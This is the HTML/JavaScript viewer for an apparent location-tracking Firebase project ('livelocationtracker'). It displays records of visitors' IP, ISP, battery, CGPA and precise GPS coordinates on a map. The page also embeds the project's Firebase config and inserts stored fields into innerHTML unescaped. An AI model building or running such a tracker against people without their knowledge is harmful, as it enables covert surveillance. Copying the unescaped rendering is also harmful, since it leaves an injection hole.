<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shared Details - AJ STUDIOZ</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
body { font-family:'Poppins',sans-serif; margin:0; padding:20px; background:linear-gradient(135deg,#100721,#1a1a2e); color:#fff; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
.container { width:100%; max-width:900px; background:rgba(16,7,33,0.6); padding:20px; border-radius:15px; backdrop-filter:blur(20px); border:1px solid rgba(255,255,255,0.15); }
h1 { text-align:center; margin-bottom:15px; }
.table-container { width:100%; overflow-x:auto; margin-top:10px; }
table { width:100%; border-collapse:collapse; min-width:600px; }
th, td { padding:10px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.2); font-size:14px; white-space:nowrap; }
th { background: rgba(255,255,255,0.1); }
tr:hover { background: rgba(255,255,255,0.2); cursor:pointer; }
tr.mobile { border-left:4px solid #4CAF50; }
tr.desktop { border-left:4px solid #2196F3; }
tr.weekend { background: rgba(255,255,255,0.15); }
.modal { display:none; position:fixed; z-index:1000; left:0; top:0; width:100%; height:100%; overflow:auto; background:rgba(0,0,0,0.7); }
.modal-content { background: rgba(16,7,33,0.95); margin:5% auto; padding:20px; border-radius:12px; max-width:650px; color:#fff; position:relative; }
.close { position:absolute; top:10px; right:15px; font-size:24px; font-weight:bold; cursor:pointer; }
#modalMap { width:100%; height:350px; margin-top:15px; border-radius:12px; }
.map-toggle { margin-top:10px; text-align:center; }
.map-toggle button { padding:8px 12px; margin:0 5px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s;}
.map-toggle button:hover{opacity:0.8;}
.loader{display:none; margin:10px auto; text-align:center;}
.loader span{display:inline-block;width:24px;height:24px;border:4px solid #0d47a1;border-top:4px solid transparent;border-radius:50%; animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
@media (max-width:700px){
  th, td { font-size:12px; padding:8px; }
  table { min-width:500px; }
  .modal-content { width:90%; }
  #modalMap { height:250px; }
}
</style>
</head>
<body>
<div class="container">
<h1>Shared Device Details</h1>
<div class="loader" id="loader"><span></span></div>
<div class="table-container">
<table id="entriesTable">
<thead>
<tr>
<th>Date / Day / Time</th>
<th>Device Type</th>
<th>IP Address</th>
<th>City</th>
</tr>
</thead>
<tbody></tbody>
</table>
</div>
</div>

<div id="detailModal" class="modal">
<div class="modal-content">
<span class="close" id="closeModal">&times;</span>
<div id="modalDetails"></div>
<div class="map-toggle">
<button id="streetBtn">Street View</button>
<button id="satBtn">Satellite View</button>
</div>
<div id="modalMap"></div>
</div>
</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCxMU9PstROo2hYxwiAFsSacjJOSPCN6Ag",
  authDomain: "livelocationtracker-bcd3d.firebaseapp.com",
  databaseURL: "https://livelocationtracker-bcd3d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "livelocationtracker-bcd3d",
  storageBucket: "livelocationtracker-bcd3d.appspot.com",
  messagingSenderId: "800051113276",
  appId: "1:800051113276:web:61f0162a9e95aba9cb4239"
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const tableBody = document.querySelector("#entriesTable tbody");
const loader = document.getElementById("loader");
const modal = document.getElementById("detailModal");
const closeModal = document.getElementById("closeModal");
const modalDetails = document.getElementById("modalDetails");
const modalMapDiv = document.getElementById("modalMap");
const streetBtn = document.getElementById("streetBtn");
const satBtn = document.getElementById("satBtn");

let modalMap, modalMarker, currentLayer;
const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution: '&copy; OpenStreetMap contributors' });
const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', { maxZoom:20, subdomains:['mt0','mt1','mt2','mt3'], attribution:'&copy; Google Satellite' });

closeModal.onclick=()=>{ modal.style.display="none"; if(modalMap){modalMap.remove(); modalMap=null;} }
window.onclick=(e)=>{ if(e.target==modal){ modal.style.display="none"; if(modalMap){modalMap.remove(); modalMap=null;} } }

// âœ… Loader fix: show loader BEFORE fetching data
loader.style.display="block";

onValue(ref(db,"locations"), snapshot=>{
  const data = snapshot.val();
  tableBody.innerHTML=""; 

  const entries = data ? Object.values(data).sort((a,b)=>b.timestamp - a.timestamp) : [];
  if(entries.length === 0){
    tableBody.innerHTML="<tr><td colspan='4'>No shared details found.</td></tr>"; 
    loader.style.display="none";  // hide loader
    return; 
  }

  entries.forEach(entry=>{
    const dateObj = new Date(entry.timestamp);
    const dayStr = dateObj.toLocaleDateString('en-US',{ weekday:'long' });
    const dateStr = `${dateObj.toLocaleDateString()} (${dayStr}) ${dateObj.toLocaleTimeString()}`;
    const tr = document.createElement("tr");
    tr.classList.add(entry.device.toLowerCase().includes("mobile") ? "mobile" : "desktop");
    if(["Saturday","Sunday"].includes(dayStr)) tr.classList.add("weekend");

    tr.innerHTML = `
      <td>${dateStr}</td>
      <td>${entry.device}</td>
      <td>${entry.ip}</td>
      <td>${entry.city}</td>
    `;
    tr.onclick = () => { openModal(entry); };
    tableBody.appendChild(tr);
  });

  loader.style.display="none";  // hide loader after table populated
});

function openModal(entry){
  modal.style.display="block";
  modalDetails.innerHTML=`
    <div><b>CGPA:</b> ${entry.cgpa}</div>
    <div><b>Device:</b> ${entry.device}</div>
    <div><b>Timezone:</b> ${entry.timezone || 'N/A'}</div>
    <div><b>Battery:</b> ${entry.battery || 'N/A'}</div>
    <div><b>IP:</b> ${entry.ip}</div>
    <div><b>ISP / Org:</b> ${entry.isp || 'N/A'}</div>
    <div><b>City:</b> ${entry.city}</div>
    <div><b>Region:</b> ${entry.region} (${entry.region_code || 'N/A'})</div>
    <div><b>Country:</b> ${entry.country}</div>
    <div><b>Postal:</b> ${entry.postal || 'N/A'}</div>
    <div><b>IP Coordinates:</b> ${entry.ip_lat}, ${entry.ip_lon}</div>
    <div><b>GPS Coordinates:</b> ${entry.gps_lat}, ${entry.gps_lon}</div>
    <div><b>Saved At:</b> ${new Date(entry.timestamp).toLocaleString()}</div>
  `;

  if(modalMap){ modalMap.remove(); modalMap=null; }
  modalMap=L.map(modalMapDiv).setView([20,0],2);
  currentLayer=streetLayer.addTo(modalMap);
  setTimeout(()=>{
    modalMap.flyTo([entry.gps_lat, entry.gps_lon],15,{animate:true,duration:3});
    modalMarker=L.marker([entry.gps_lat, entry.gps_lon]).addTo(modalMap)
      .bindPopup(`Device: ${entry.device}<br>CGPA: ${entry.cgpa}<br>${entry.city}, ${entry.region}, ${entry.country}<br>ISP: ${entry.isp || 'N/A'}`).openPopup();
  },300);
}

streetBtn.onclick=()=>{ if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer=streetLayer.addTo(modalMap); } };
satBtn.onclick=()=>{ if(modalMap && currentLayer){ modalMap.removeLayer(currentLayer); currentLayer=satLayer.addTo(modalMap); } };
</script>
</body>
</html>

